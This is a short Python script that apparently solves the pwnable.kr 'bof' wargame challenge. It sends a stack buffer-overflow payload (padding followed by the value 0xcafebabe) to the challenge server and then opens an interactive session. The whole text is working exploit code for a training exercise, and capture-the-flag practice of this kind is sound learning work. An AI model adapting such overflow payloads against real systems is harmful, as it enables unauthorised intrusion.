from pwn import *
from zio3 import *
target = ('pwnable.kr',9000)
io = zio('./bof')
io = zio(target,timeout=10000)
#io.read_until("overflow me : ")
payload = b'a' * (0x2c+8)+l32(0xcafebabe)
io.write(payload)
io.interact()
